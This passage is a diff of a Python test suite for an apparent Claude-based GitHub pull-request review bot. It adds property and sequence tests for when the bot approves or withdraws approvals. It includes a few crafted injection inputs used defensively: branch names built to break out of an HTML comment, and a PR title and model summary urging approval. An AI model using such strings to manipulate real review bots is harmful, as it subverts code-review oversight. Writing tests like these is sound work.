@@ -12,9 +12,15 @@ layer and a fake model (including re-checking a stored verdict on label,
 edit, and reopen events), the real GitHub client against a fake HTTP
 transport (pagination, read-only dry runs), and the real anthropic SDK
 against an httpx2 mock transport, so the request shape and the response
-parsing are checked against the SDK itself. A last group pins the
-workflow's security invariants. Nothing leaves the machine and no API key
-is needed.
+parsing are checked against the SDK itself. The bot's own approval has
+properties of its own: the approval plan over any review listing, and runs
+of random event sequences (pushes that skip files, labels, drafts,
+retargets, manual runs, failing comment writes, jobs cancelled mid-review)
+where the bot never holds an approval while a review runs or while the
+head's verdict has a P1 or did not cover every changed file, and a twin PR
+whose approvals GitHub refuses gets the same checks and comments. A last
+group pins the workflow's security invariants. Nothing leaves the machine
+and no API key is needed.
 """
 
 from __future__ import annotations
@@ -31,7 +37,7 @@ import threading
 import unittest
 from dataclasses import replace
 from pathlib import Path
-from typing import Any, Mapping
+from typing import Any, Callable, Mapping
 from unittest import mock
 
 import anthropic
@@ -128,6 +134,7 @@ def comment_inputs(**overrides: Any) -> review.CommentInputs:
         usage=(review.Usage(review.MODEL, 1_000, 100),),
         override=False,
         served_by=review.MODEL,
+        base_ref="main",  # make_pr()'s base branch
     )
     return replace(inputs, **overrides)
 
@@ -174,8 +181,16 @@ def status_error(status: int, error_type: str) -> anthropic.APIStatusError:
     return anthropic.APIStatusError("fake", response=response, body=body)
 
 
+# GitHub's messages while the setting that lets Actions approve is off: the
+# one reported for approving, and the one documented for creating a PR.
+REFUSAL = "GitHub Actions is not permitted to approve pull requests."
+CREATE_REFUSAL = "GitHub Actions is not permitted to create or approve pull requests."
+
+
 class FakeGitHub:
-    """In-memory GitHub layer that records every call."""
+    """In-memory GitHub layer that records every call. Comment writes go to
+    writes; review calls (approvals and dismissals, refused ones included)
+    go to review_calls, and reviews holds what GitHub would list."""
 
     def __init__(
         self,
@@ -185,6 +200,9 @@ class FakeGitHub:
         *,
         later_pr: review.PullRequest | None = None,
         fail: tuple[str, ...] = (),
+        reviews: list[review.PullReview] | None = None,
+        refuse_approval: int | None = None,
+        refusal: str = REFUSAL,
     ) -> None:
         self.pr = pr
         self.later_pr = later_pr or pr
@@ -193,8 +211,19 @@ class FakeGitHub:
         self.fail = set(fail)
         self.reads: list[str] = []
         self.writes: list[tuple[str, int, str]] = []
+        self.reviews = list(reviews or [])
+        # The HTTP status and message GitHub refuses approvals with (the org setting is off, by default).
+        self.refuse_approval = refuse_approval
+        self.refusal = refusal
+        self.review_calls: list[tuple[str, str | int, str]] = []
         self._pull_reads = 0
         self._next_id = 1_000
+        self._next_review = 9_000
+
+    def set_pr(self, pr: review.PullRequest) -> None:
+        """The PR as the next event's run reads it."""
+        self.pr = self.later_pr = pr
+        self._pull_reads = 0
 
     def _maybe_fail(self, name: str) -> None:
         if name in self.fail:
@@ -232,6 +261,27 @@ class FakeGitHub:
             review.IssueComment(c.id, c.author, body) if c.id == comment_id else c for c in self.comments
         ]
 
+    def list_pull_reviews(self, number: int) -> list[review.PullReview]:
+        self.reads.append("reviews")
+        self._maybe_fail("reviews")
+        return list(self.reviews)
+
+    def approve_pull_request(self, number: int, commit_id: str, body: str) -> None:
+        self.review_calls.append(("APPROVE", commit_id, body))
+        if self.refuse_approval is not None:
+            raise review.GitHubError(
+                f"GitHub POST /repos/{REPO}/pulls/{number}/reviews returned HTTP {self.refuse_approval}: {self.refusal}",
+                status=self.refuse_approval,
+            )
+        self._maybe_fail("approve")
+        self._next_review += 1
+        self.reviews.append(review.PullReview(self._next_review, review.BOT_LOGIN, review.APPROVED, commit_id))
+
+    def dismiss_pull_review(self, number: int, review_id: int, message: str) -> None:
+        self.review_calls.append(("DISMISS", review_id, message))
+        self._maybe_fail("dismiss")
+        self.reviews = [replace(r, state="DISMISSED") if r.id == review_id else r for r in self.reviews]
+
 
 class NoWriteGitHub(FakeGitHub):
     def create_issue_comment(self, number: int, body: str) -> None:
@@ -240,14 +290,35 @@ class NoWriteGitHub(FakeGitHub):
     def update_issue_comment(self, comment_id: int, body: str) -> None:
         raise UnexpectedCall("a dry run must never edit")
 
+    def approve_pull_request(self, number: int, commit_id: str, body: str) -> None:
+        raise UnexpectedCall("a dry run must never approve")
+
+    def dismiss_pull_review(self, number: int, review_id: int, message: str) -> None:
+        raise UnexpectedCall("a dry run must never dismiss a review")
+
+
+def bot_review(review_id: int, sha: str | None, state: str = review.APPROVED) -> review.PullReview:
+    return review.PullReview(review_id, review.BOT_LOGIN, state, sha)
+
+
+def approved_commits(github: FakeGitHub) -> list[str | None]:
+    """The commits the bot has an active approval on, oldest review first."""
+    return [r.commit_id for r in github.reviews if r.author == review.BOT_LOGIN and r.state == review.APPROVED]
+
 
 class UnexpectedCall(BaseException):
     """Raised by a fake that a run must not reach. A BaseException, so the
     run's fail-open boundary (except Exception) cannot swallow it."""
 
 
+class Cancelled(BaseException):
+    """The runner stopping the job mid-run, as a newer push, a person, or the
+    job timeout does. GitHub sends SIGINT, which Python raises as
+    KeyboardInterrupt, a BaseException, so nothing after that point runs."""
+
+
 class FakeModel:
-    def __init__(self, *outcomes: review.ModelReply | Exception) -> None:
+    def __init__(self, *outcomes: review.ModelReply | BaseException) -> None:
         self.outcomes = list(outcomes)
         self.requests: list[tuple[review.ReviewRequest, float]] = []
 
@@ -256,9 +327,23 @@ class FakeModel:
         if not self.outcomes:
             raise UnexpectedCall("the fake model has no more outcomes")
         outcome = self.outcomes.pop(0)
-        if isinstance(outcome, Exception):
+        if isinstance(outcome, BaseException):
             raise outcome
         return outcome
+
+
+class WatchedModel(FakeModel):
+    """A fake model that notes the bot's active approvals each time a run
+    asks it, which is while that run's review is in progress."""
+
+    def __init__(self, github: FakeGitHub, *outcomes: review.ModelReply | BaseException) -> None:
+        super().__init__(*outcomes)
+        self.github = github
+        self.approvals_seen: list[list[str | None]] = []
+
+    def create(self, request: review.ReviewRequest, timeout: float) -> review.ModelReply:
+        self.approvals_seen.append(approved_commits(self.github))
+        return super().create(request, timeout)
 
 
 class FakeClock:
@@ -305,7 +390,11 @@ class Run:
             clock=self.clock,
             sleep=self.clock.sleep,
         )
-        self.code = review.run(review.Options(repo=REPO, pr=7, **options), runtime)
+        self.code: int | None
+        try:
+            self.code = review.run(review.Options(repo=REPO, pr=7, **options), runtime)
+        except Cancelled:
+            self.code = None  # the job stopped mid-run, so it reported nothing
         self.output = self.out.getvalue()
 
 
@@ -582,9 +671,12 @@ class CommentProperties(unittest.TestCase):
         self.assertLessEqual(len(body), review.COMMENT_LIMIT)
         self.assertTrue(body.startswith(review.MARKER + "\n"))
         counts = review.severity_counts(findings)
-        # The state line carries the verdict, so a later event can re-check it.
+        # The state line carries the verdict, so a later event can re-check it,
+        # with whether every changed file was reviewed and the base branch.
         state = review.parse_state(body)
-        self.assertEqual(state, review.StickyState(HEAD, "reviewed", None, (counts["P1"], counts["P2"], counts["P3"])))
+        tally = (counts["P1"], counts["P2"], counts["P3"])
+        expected = review.StickyState(HEAD, "reviewed", None, tally, complete=not skipped, base=review.base_digest("main"))
+        self.assertEqual(state, expected)
         if findings:
             self.assertIn(f"**{counts['P1']} P1, {counts['P2']} P2, {counts['P3']} P3.**", body)
         else:
@@ -620,13 +712,40 @@ class StateProperties(unittest.TestCase):
         st.sampled_from(["pending", "reviewed", "not_reviewed"]),
         st.one_of(st.none(), st.text(alphabet="0123456789abcdef", min_size=16, max_size=16)),
         st.one_of(st.none(), st.tuples(*(st.integers(min_value=0, max_value=500) for _ in range(3)))),
+        st.booleans(),
+        st.booleans(),
+        # Git allows branch names like these, which must not break the hidden line.
+        st.none() | st.text() | st.sampled_from(["main", "release/1.0", "a-->b", "x--!>y", "fix@home", "issue#12", "gh-7"]),
     )
     def test_state_line_round_trips(
-        self, sha: str, status: str, reviewer: str | None, counts: tuple[int, int, int] | None
+        self,
+        sha: str,
+        status: str,
+        reviewer: str | None,
+        counts: tuple[int, int, int] | None,
+        model_ran: bool,
+        complete: bool,
+        base_ref: str | None,
     ) -> None:
         mapping = None if counts is None else dict(zip(review.SEVERITIES, counts))
-        line = review.state_line(sha, status, reviewer=reviewer, counts=mapping)
-        self.assertEqual(review.parse_state(f"{review.MARKER}\n{line}\nrest"), review.StickyState(sha, status, reviewer, counts))
+        line = review.state_line(
+            sha, status, reviewer=reviewer, counts=mapping, model_ran=model_ran, complete=complete, base_ref=base_ref
+        )
+        base = None if base_ref is None else review.base_digest(base_ref)
+        self.assertEqual(
+            review.parse_state(f"{review.MARKER}\n{line}\nrest"),
+            review.StickyState(sha, status, reviewer, counts, model_ran, complete, base),
+        )
+        # A flag that is true is left out, so lines from before it keep their meaning.
+        for key, value in (("model_ran", model_ran), ("complete", complete)):
+            if value:
+                self.assertNotIn(key, line)
+        # Whatever the branch is called, the line stays one HTML comment, and
+        # the comment's mention and reference breaking leaves it as it is.
+        self.assertEqual(line.count("-->"), 1)
+        self.assertNotIn("--!>", line)
+        self.assertEqual(review.neutralize(line), line)
+        self.assertEqual(len(line.splitlines()), 1)
 
     @PBT
     @given(JSON_VALUES)
@@ -635,6 +754,16 @@ class StateProperties(unittest.TestCase):
         if state is not None:
             self.assertIsInstance(state.sha, str)
             self.assertTrue(state.counts is None or all(isinstance(n, int) and n >= 0 for n in state.counts))
+
+    @PBT
+    @given(st.sampled_from(["model_ran", "complete"]), st.just(True) | JSON_VALUES)
+    def test_only_a_true_flag_reads_as_true(self, key: str, value: object) -> None:
+        # Anything else errs toward "not (fully) reviewed", which never approves.
+        data = {"sha": HEAD, "status": "reviewed", "p1": 0, "p2": 0, "p3": 0, key: value}
+        state = review.parse_state(f"{review.MARKER}\n{review.STATE_PREFIX}{json.dumps(data)} -->")
+        self.assertIsNotNone(state)
+        self.assertEqual(getattr(state, key), value is True)
+        self.assertTrue(getattr(state, "complete" if key == "model_ran" else "model_ran"))
 
     def test_counts_must_be_whole_and_complete(self) -> None:
         for extra in ({"p1": 1, "p2": 0}, {"p1": True, "p2": 0, "p3": 0}, {"p1": -1, "p2": 0, "p3": 0}, {"p1": 1.0, "p2": 0, "p3": 0}):
@@ -862,7 +991,9 @@ class LiveRunTests(unittest.TestCase):
         self.assertEqual(len(github.comments), 1)
         body = github.writes[-1][2]
         self.assertTrue(body.startswith(review.MARKER))
-        self.assertEqual(review.parse_state(body), review.StickyState(HEAD, "reviewed", FINGERPRINT, (1, 0, 1)))
+        self.assertEqual(
+            review.parse_state(body), review.StickyState(HEAD, "reviewed", FINGERPRINT, (1, 0, 1), base=review.base_digest("main"))
+        )
         self.assertIn(f"Claude review of `{HEAD[:7]}`", body)
         self.assertIn("**1 P1, 0 P2, 1 P3.**", body)
         self.assertIn("Answer logged", body)
@@ -1490,7 +1621,11 @@ class NothingReviewableTests(unittest.TestCase):
         self.assertNotIn("No findings", body)
         self.assertIn("No model ran, so this cost nothing.", body)
         self.assertIn("2 files not reviewed", body)
-        self.assertEqual(review.parse_state(body), review.StickyState(HEAD, "reviewed", FINGERPRINT, (0, 0, 0)))
+        # The state line says no model ran, so a later re-check knows this is not an all clear.
+        expected = review.StickyState(
+            HEAD, "reviewed", FINGERPRINT, (0, 0, 0), model_ran=False, complete=False, base=review.base_digest("main")
+        )
+        self.assertEqual(review.parse_state(body), expected)
 
     def test_an_empty_pr_and_a_secret_file_only_pr(self) -> None:
         empty = FakeGitHub(make_pr(changed_files=0), [])
@@ -1541,6 +1676,676 @@ class DryRunTests(unittest.TestCase):
         self.assertEqual(transport.calls, [])
 
 
+# --- the bot's approval ------------------------------------------------------------------------
+
+
+def bot_sticky(body: str) -> list[review.IssueComment]:
+    return [review.IssueComment(55, review.BOT_LOGIN, body)]
+
+
+def review_listing(entries: list[tuple[str, str, str | None]], repeated: int) -> list[review.PullReview]:
+    """Reviews as GitHub lists them: one id per review, oldest first, and
+    the first few listed again, as when a page shifts while it is read."""
+    reviews = [review.PullReview(i + 1, author, state, sha) for i, (author, state, sha) in enumerate(entries)]
+    return reviews + reviews[:repeated]
+
+
+REVIEW_LISTINGS = st.builds(
+    review_listing,
+    st.lists(
+        st.tuples(
+            st.sampled_from([review.BOT_LOGIN, "kurt", ""]),
+            st.sampled_from([review.APPROVED, "DISMISSED", "COMMENTED", "CHANGES_REQUESTED", "PENDING"]),
+            st.sampled_from([HEAD, NEW_HEAD, OLD_HEAD, None]),
+        ),
+        max_size=8,
+    ),
+    st.integers(min_value=0, max_value=3),
+)
+# Reviews already on the PR when a sequence of runs starts: a person's, and
+# the bot's own from earlier (an approval from when the setting was on, say).
+# Each author has at most one review per commit, drawn slot by slot, so no
+# draw is ever filtered out and each slot shrinks to having no review.
+SEED_SLOTS = [(author, sha) for author in (review.BOT_LOGIN, "kurt") for sha in (HEAD, OLD_HEAD, None)]
+SEED_REVIEWS = st.tuples(
+    *(st.none() | st.sampled_from([review.APPROVED, "DISMISSED", "COMMENTED", "CHANGES_REQUESTED"]) for _ in SEED_SLOTS)
+).map(
+    lambda states: [
+        review.PullReview(500 + i, author, state, sha)
+        for i, ((author, sha), state) in enumerate(zip(SEED_SLOTS, states))
+        if state is not None
+    ]
+)
+
+
+def apply_plan(
+    reviews: list[review.PullReview], post: bool, dismiss: tuple[int, ...], head: str
+) -> list[review.PullReview]:
+    """reviews once GitHub has carried out plan_approval's answer."""
+    after = [replace(r, state="DISMISSED") if r.id in dismiss else r for r in reviews]
+    if post:
+        after.append(bot_review(max((r.id for r in reviews), default=0) + 1, head))
+    return after
+
+
+class ApprovalPlanProperties(unittest.TestCase):
+    @PBT
+    @given(REVIEW_LISTINGS, st.sampled_from([HEAD, NEW_HEAD]), st.booleans(), st.booleans())
+    def test_one_plan_reaches_the_verdict_and_touches_only_the_bots_approvals(
+        self, reviews: list[review.PullReview], head: str, approve: bool, keep_head: bool
+    ) -> None:
+        post, dismiss = review.plan_approval(reviews, review.BOT_LOGIN, head, approve=approve, keep_head=keep_head)
+        approvals = {r.id for r in reviews if r.author == review.BOT_LOGIN and r.state == review.APPROVED}
+        self.assertEqual(len(dismiss), len(set(dismiss)))  # each one once, even when listed twice
+        self.assertLessEqual(set(dismiss), approvals)  # nobody else's review, and none of the bot's others
+        after = apply_plan(reviews, post, dismiss, head)
+        approved = [r.commit_id for r in after if r.author == review.BOT_LOGIN and r.state == review.APPROVED]
+        if approve:
+            self.assertEqual(dismiss, ())
+            self.assertIn(head, approved)
+            # Never a duplicate: it posts only when the bot had no active approval of head.
+            self.assertEqual(post, head not in [r.commit_id for r in reviews if r.id in approvals])
+        else:
+            self.assertFalse(post)
+            # Withdrawing leaves the bot no approval, or with keep_head exactly its approvals of head.
+            kept = [r.commit_id for r in reviews if r.id in approvals and r.commit_id == head] if keep_head else []
+            self.assertEqual(approved, kept)
+        # One plan is enough: planning again on the result changes nothing.
+        again = review.plan_approval(after, review.BOT_LOGIN, head, approve=approve, keep_head=keep_head)
+        self.assertEqual(again, (False, ()))
+
+    @PBT
+    @given(
+        JSON_VALUES
+        | st.fixed_dictionaries(
+            {
+                "id": JSON_VALUES,
+                "user": JSON_VALUES | st.fixed_dictionaries({"login": JSON_VALUES}),
+                "state": JSON_VALUES,
+                "commit_id": JSON_VALUES,
+            }
+        )
+    )
+    def test_any_review_entry_parses_or_is_a_github_error(self, value: object) -> None:
+        # A GitHubError is a failure the approval step logs; anything else would be a bug.
+        try:
+            parsed = review.parse_pull_review(value)
+        except review.GitHubError:
+            return
+        self.assertIsInstance(parsed.id, int)
+        self.assertIsInstance(parsed.author, str)
+        self.assertIsInstance(parsed.state, str)
+        self.assertTrue(parsed.commit_id is None or isinstance(parsed.commit_id, str))
+
+    def test_the_review_texts_are_fixed_and_safe(self) -> None:
+        texts = (
+            review.APPROVAL_BODY,
+            review.WITHDRAWN_FOR_P1,
+            review.WITHDRAWN_UNREVIEWED,
+            review.WITHDRAWN_PARTIAL,
+            review.WITHDRAWN_FOR_REVIEW,
+            review.WITHDRAWN_UNCONFIRMED,
+        )
+        for text in texts:
+            self.assertEqual(review.clean(text), text)  # no mention, issue reference or markup to break
+
+    @PBT
+    @given(st.integers(min_value=100, max_value=599) | st.none(), st.sampled_from([REFUSAL, CREATE_REFUSAL]))
+    def test_only_the_settings_refusal_names_the_setting(self, status: int | None, refusal: str) -> None:
+        """GitHub's refusal while the setting is off is a notice that names
+        it. The same status for any other cause (approving its own PR, a
+        rate limit, a missing permission) is a warning, as is that text with
+        another status."""
+
+        def error(text: str) -> review.GitHubError:
+            return review.GitHubError(f"GitHub POST /repos/{REPO}/pulls/7/reviews returned HTTP {status}: {text}", status=status)
+
+        self.assertEqual(review.refused_by_setting(error(refusal)), status in review.APPROVAL_REFUSED_STATUSES)
+        for other in (
+            "Unprocessable Entity",
+            "Can not approve your own pull request",
+            "Resource not accessible by integration",
+            "You have exceeded a secondary rate limit. Please wait a few minutes before you try again.",
+            review.APPROVAL_SETTING,  # GitHub never says this; the bot's own notice does
+        ):
+            self.assertFalse(review.refused_by_setting(error(other)), other)
+        self.assertFalse(review.refused_by_setting(review.ReviewError(REFUSAL)))  # not an answer from GitHub
+
+
+# One event on the PR and the run it starts: what happens to the PR, what
+# the model answers if the run asks it (a cancelled job stops the run right
+# there), what a push changes, and whether the bot's comment writes fail.
+STEP_EVENTS = (
+    "push",
+    "add the override label",
+    "remove the override label",
+    "convert to draft",
+    "mark ready",
+    "retarget",
+    "edit",
+    "manual run",
+)
+MODEL_ANSWERS: dict[str, Callable[[], review.ModelReply | BaseException]] = {
+    "no findings": lambda: reply_with([]),
+    "a P2": lambda: reply_with([finding("P2")]),
+    "a P1": lambda: reply_with([finding("P1")]),
+    "an API error": lambda: status_error(400, "invalid_request_error"),
+    "a refusal": lambda: reply_with([], stop_reason="refusal", text=""),
+    "a cut-off answer": lambda: reply_with([finding("P3")], stop_reason="max_tokens"),
+    "a cancelled job": Cancelled,
+}
+PUSH_CHANGES: dict[str, list[review.ChangedFile]] = {
+    "code": FILES,
+    "code and an image": [*FILES, make_file("public/logo.png", None)],  # the image never reaches the model
+    "only a lockfile": [make_file("pnpm-lock.yaml")],
+    "a secret file": [*FILES, make_file(".env", "@@ -0,0 +1 @@\n+KEY=1")],
+}
+STEPS = st.tuples(
+    st.sampled_from(STEP_EVENTS), st.sampled_from(sorted(MODEL_ANSWERS)), st.sampled_from(sorted(PUSH_CHANGES)), st.booleans()
+)
+
+
+def after_event(pr: review.PullRequest, event: str, push: int, change: str) -> review.PullRequest:
+    if event == "push":
+        return replace(pr, head_sha=f"{push:040x}", changed_files=len(PUSH_CHANGES[change]))
+    if event == "add the override label":
+        return replace(pr, labels=(review.OVERRIDE_LABEL,))
+    if event == "remove the override label":
+        return replace(pr, labels=())
+    if event == "convert to draft":
+        return replace(pr, draft=True)
+    if event == "mark ready":
+        return replace(pr, draft=False)
+    if event == "retarget":  # same head, another base branch, so another diff
+        return replace(pr, base_ref="release/1.0" if pr.base_ref == "main" else "main")
+    return pr  # an edit or a manual run changes nothing the bot reads
+
+
+def clean_verdict(github: FakeGitHub, pr: review.PullRequest) -> bool:
+    """Whether the bot's comment holds a finished review of pr's head with no
+    P1 that sent every changed file to the model, made against pr's base."""
+    stickies = review.find_stickies(github.comments, review.BOT_LOGIN)
+    state = review.parse_state(stickies[0].body) if stickies else None
+    return (
+        state is not None
+        and (state.sha, state.status) == (pr.head_sha, "reviewed")
+        and state.counts is not None
+        and state.counts[0] == 0
+        and state.model_ran
+        and state.complete
+        and state.base == review.base_digest(pr.base_ref)
+    )
+
+
+class ApprovalSequenceProperties(unittest.TestCase):
+    @PBT
+    @given(SEED_REVIEWS, st.lists(STEPS, min_size=1, max_size=8), st.sampled_from(sorted(review.APPROVAL_REFUSED_STATUSES)))
+    def test_the_bot_approves_only_a_head_with_a_complete_clean_review(
+        self, seed: list[review.PullReview], steps: list[tuple[str, str, str, bool]], refused_with: int
+    ) -> None:
+        """Once a PR event run has gone through, the bot has no active
+        approval at all unless its comment holds a complete clean review of
+        the head (no P1, every changed file sent to the model, the current
+        base branch), and a PR event run that ends on one leaves exactly one
+        on the head. While a PR event run's model works the bot has no
+        approval, so a job cancelled mid-review leaves none behind, and a run
+        whose comment writes fail never leaves one. A twin PR whose approvals
+        GitHub refuses (the org setting is off) ends every step with the same
+        check and comments, and logs one notice per refused approval."""
+        allowed = FakeGitHub(make_pr(), FILES, reviews=seed)
+        refused = FakeGitHub(make_pr(), FILES, reviews=seed, refuse_approval=refused_with)
+        people = [r for r in seed if r.author != review.BOT_LOGIN]
+        pr, synced = make_pr(), False
+        for push, (event, answer, change, writes_fail) in enumerate(steps, start=1):
+            pr = after_event(pr, event, push, change)
+            manual = event == "manual run"
+            codes = []
+            for github in (allowed, refused):
+                github.set_pr(pr)
+                github.fail = {"write"} if writes_fail else set()
+                if event == "push":
+                    github.files = PUSH_CHANGES[change]
+                reviews, calls, reads = list(github.reviews), len(github.review_calls), len(github.reads)
+                model = WatchedModel(github, MODEL_ANSWERS[answer]())
+                run = Run(github, model, env=DISPATCH_ENV if manual else LIVE_ENV)
+                codes.append(run.code)
+                if manual:  # never reads, approves or dismisses
+                    self.assertEqual((github.reviews, len(github.review_calls)), (reviews, calls))
+                    self.assertNotIn("reviews", github.reads[reads:])
+                else:  # the comment says the push is being reviewed, so nothing is approved meanwhile
+                    self.assertEqual([seen for seen in model.approvals_seen if seen], [])
+                attempts = [call for call in github.review_calls[calls:] if call[0] == "APPROVE"]
+                self.assertLessEqual(len(attempts), 1)  # never a retry
+                notices = [line for line in run.output.splitlines() if review.APPROVAL_SETTING in line]
+                self.assertEqual(len(notices), len(attempts) if github is refused else 0)
+                self.assertTrue(all(line.startswith("::notice::") for line in notices))
+            # Approvals never change the check or the comment.
+            self.assertEqual(codes[0], codes[1])
+            self.assertEqual(allowed.comments, refused.comments)
+            synced = synced or not manual
+            clean = clean_verdict(allowed, pr)
+            for github in (allowed, refused):
+                self.assertEqual([r for r in github.reviews if r.author != review.BOT_LOGIN], people)
+                if synced and not clean:
+                    self.assertEqual(approved_commits(github), [])
+            if clean and not manual:
+                self.assertEqual(approved_commits(allowed).count(pr.head_sha), 1)
+            self.assertEqual([r.id for r in refused.reviews], [r.id for r in seed])  # GitHub never took one
+
+    @PBT
+    @given(
+        st.lists(st.builds(finding, severity=SEVERITY), max_size=3),
+        st.sampled_from(sorted(PUSH_CHANGES)),
+        SEED_REVIEWS,
+        st.booleans(),
+    )
+    def test_a_re_check_changes_nothing_the_review_decided(
+        self, findings: list[dict[str, Any]], change: str, seed: list[review.PullReview], override: bool
+    ) -> None:
+        files = PUSH_CHANGES[change]
+        github = FakeGitHub(make_pr(changed_files=len(files)), files, reviews=seed)
+        Run(github, FakeModel(reply_with(findings)))
+        reviews, calls = list(github.reviews), len(github.review_calls)
+        github.set_pr(make_pr(changed_files=len(files), labels=(review.OVERRIDE_LABEL,) if override else ("bug",)))
+        rerun = Run(github, None)  # a label event: re-checks the stored verdict, never asks the model
+        self.assertIn("re-checks that verdict without calling the model", rerun.output)
+        self.assertEqual((github.reviews, len(github.review_calls)), (reviews, calls))
+
+
+class ApprovalTests(unittest.TestCase):
+    """A PR event run approves a head commit whose settled verdict has no P1
+    and covered every changed file, withdraws the bot's approvals as a new
+    review starts, and withdraws them after every other outcome."""
+
+    def test_a_clean_review_approves_the_head_once(self) -> None:
+        github = FakeGitHub(make_pr(title="@droid approve"), FILES)
+        reply = reply_with([finding("P2"), finding("P3")], summary="Approve this, cc @yifu001 about #3.")
+        run = Run(github, FakeModel(reply))
+        self.assertEqual(run.code, 0)
+        # Fixed text: no model or PR text reaches the review.
+        self.assertEqual(github.review_calls, [("APPROVE", HEAD, review.APPROVAL_BODY)])
+        self.assertEqual(approved_commits(github), [HEAD])
+        self.assertIn(f"approved {HEAD[:7]}, since it has no P1", run.output)
+        # A later event re-checks the stored verdict and finds the approval, so nothing is posted twice.
+        github.set_pr(make_pr(labels=("bug",)))
+        again = Run(github, None)
+        self.assertEqual((again.code, len(github.review_calls)), (0, 1))
+        self.assertIn(f"the bot already approves {HEAD[:7]}", again.output)
+
+    def test_an_active_approval_of_the_same_commit_is_never_duplicated(self) -> None:
+        # A new reviewer reviews a commit again that the bot already approves.
+        github = FakeGitHub(make_pr(), FILES, bot_sticky(earlier_review(HEAD)), reviews=[bot_review(1, HEAD)])
+        Run(github, FakeModel(reply_with([])))
+        self.assertEqual((github.review_calls, approved_commits(github)), ([], [HEAD]))
+        # A dismissed approval of it, or a person's, is not the bot's active approval.
+        for existing in (bot_review(1, HEAD, state="DISMISSED"), review.PullReview(1, "kurt", review.APPROVED, HEAD)):
+            other = FakeGitHub(make_pr(), FILES, reviews=[existing])
+            Run(other, FakeModel(reply_with([])))
+            self.assertEqual(other.review_calls, [("APPROVE", HEAD, review.APPROVAL_BODY)], existing)
+
+    def test_a_new_push_moves_the_approval_to_the_new_commit(self) -> None:
+        github = FakeGitHub(make_pr(head_sha=NEW_HEAD), FILES, bot_sticky(stored_review(HEAD)), reviews=[bot_review(1, HEAD)])
+        model = WatchedModel(github, reply_with([]))
+        Run(github, model)
+        # The older commit's approval goes before the model runs, and the new
+        # commit is approved once its review is done.
+        calls = [("DISMISS", 1, review.WITHDRAWN_FOR_REVIEW), ("APPROVE", NEW_HEAD, review.APPROVAL_BODY)]
+        self.assertEqual(github.review_calls, calls)
+        self.assertEqual(model.approvals_seen, [[]])
+        self.assertEqual(approved_commits(github), [NEW_HEAD])
+
+    def test_a_cancelled_review_leaves_no_approval_standing(self) -> None:
+        github = FakeGitHub(make_pr(), FILES)
+        Run(github, FakeModel(reply_with([])))
+        self.assertEqual(approved_commits(github), [HEAD])
+        # A new push whose job is cancelled, or times out, while the model works.
+        github.set_pr(make_pr(head_sha=NEW_HEAD))
+        model = WatchedModel(github, Cancelled())
+        run = Run(github, model)
+        self.assertIsNone(run.code)
+        self.assertEqual(model.approvals_seen, [[]])
+        self.assertEqual(state_of(github.comments[0].body), (NEW_HEAD, "pending"))
+        self.assertEqual(approved_commits(github), [])
+        self.assertIn("withdrew 1 approval by the bot, since a review of the latest push is starting", run.output)
+        # A finished review of this same commit that the comment still shows
+        # (by an older reviewer here) keeps its approval while the new review
+        # runs. Approvals of other commits go.
+        kept = FakeGitHub(
+            make_pr(), FILES, bot_sticky(stored_review(HEAD, fingerprint="0" * 16)), reviews=[bot_review(1, OLD_HEAD), bot_review(2, HEAD)]
+        )
+        model = WatchedModel(kept, Cancelled())
+        Run(kept, model)
+        self.assertEqual(model.approvals_seen, [[HEAD]])
+        self.assertEqual(kept.review_calls, [("DISMISS", 1, review.WITHDRAWN_FOR_REVIEW)])
+
+    def test_a_p1_withdraws_every_approval_by_the_bot_even_with_the_override_label(self) -> None:
+        people = [review.PullReview(2, "kurt", review.APPROVED, HEAD), review.PullReview(3, "mallory", "CHANGES_REQUESTED", HEAD)]
+        mine = [bot_review(1, OLD_HEAD), bot_review(4, HEAD), bot_review(5, OLD_HEAD, "DISMISSED"), bot_review(6, HEAD, "COMMENTED")]
+        # The comment shows an older reviewer's clean review of HEAD, so the
+        # approval of HEAD stands until the new verdict replaces it.
+        older_reviewers = bot_sticky(stored_review(HEAD, fingerprint="0" * 16))
+        for labels, code in (((), 1), ((review.OVERRIDE_LABEL,), 0)):
+            github = FakeGitHub(make_pr(labels=labels), FILES, older_reviewers, reviews=[*people, *mine])
+            run = Run(github, FakeModel(reply_with([finding("P1")])))
+            self.assertEqual(run.code, code, labels)  # the label decides the check, never the approval
+            withdrawn = [("DISMISS", 1, review.WITHDRAWN_FOR_REVIEW), ("DISMISS", 4, review.WITHDRAWN_FOR_P1)]
+            self.assertEqual(github.review_calls, withdrawn, labels)
+            self.assertEqual(approved_commits(github), [], labels)
+            self.assertEqual([r for r in github.reviews if r.author != review.BOT_LOGIN], people, labels)
+            self.assertIn("withdrew 1 approval by the bot, since the latest push has a P1", run.output)
+
+    def test_every_push_that_was_not_reviewed_withdraws_the_approval(self) -> None:
+        no_key = {"GITHUB_ACTIONS": "true"}
+        # Each case, and whether its review got as far as starting, which withdraws the approval first.
+        cases: dict[str, tuple[review.PullRequest, list[review.ChangedFile], tuple[str, ...], FakeModel | None, Mapping[str, str], bool]] = {
+            "Anthropic error": (make_pr(), FILES, (), FakeModel(status_error(400, "invalid_request_error")), LIVE_ENV, True),
+            "refusal": (make_pr(), FILES, (), FakeModel(reply_with([], stop_reason="refusal", text="")), LIVE_ENV, True),
+            "cut-off answer": (make_pr(), FILES, (), FakeModel(reply_with([], stop_reason="max_tokens")), LIVE_ENV, True),
+            "file listing failed": (make_pr(), FILES, ("files",), None, LIVE_ENV, True),
+            "a bug in the review": (make_pr(), FILES, (), FakeModel(RuntimeError("boom")), LIVE_ENV, True),
+            "nothing could be sent to the model": (make_pr(changed_files=1), [make_file("pnpm-lock.yaml")], (), None, LIVE_ENV, True),
+            "draft": (make_pr(draft=True), FILES, (), None, LIVE_ENV, False),
+            "missing key": (make_pr(), FILES, (), None, no_key, False),
+        }
+        for name, (pr, files, fail, model, env, started) in cases.items():
+            github = FakeGitHub(pr, files, bot_sticky(stored_review(OLD_HEAD)), fail=fail, reviews=[bot_review(1, OLD_HEAD)])
+            run = Run(github, model, env=env)
+            self.assertEqual(run.code, 0, name)
+            text = review.WITHDRAWN_FOR_REVIEW if started else review.WITHDRAWN_UNREVIEWED
+            self.assertEqual(github.review_calls, [("DISMISS", 1, text)], name)
+            self.assertEqual(approved_commits(github), [], name)
+        # A finished review of this same commit by an older reviewer stays in
+        # the comment when the new review fails, so its approval stood during
+        # the review, but this run settled nothing, so it goes at the end.
+        older_reviewers = bot_sticky(stored_review(HEAD, fingerprint="0" * 16))
+        github = FakeGitHub(make_pr(), FILES, older_reviewers, reviews=[bot_review(1, HEAD)])
